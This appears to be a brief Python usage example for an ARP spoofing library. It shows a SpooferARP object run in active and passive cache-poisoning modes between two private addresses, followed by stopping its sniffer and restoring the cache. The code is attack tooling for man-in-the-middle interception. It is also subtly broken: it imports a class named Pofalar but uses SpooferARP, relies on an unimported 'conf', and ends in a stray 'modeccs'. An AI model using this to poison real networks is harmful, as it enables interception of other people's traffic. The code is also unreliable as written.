from ArpSpoof import Pofalar

spoofer = SpooferARP('192.168.20.1', '192.168.10.2') 
spoofer.active_cache_poisonning()

spoofer = SpooferARP('192.168.20.1', '192.168.10.2', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()                                   # only with asynchronous mode
spoofer.restore()                                        # only with asynchronous modeccs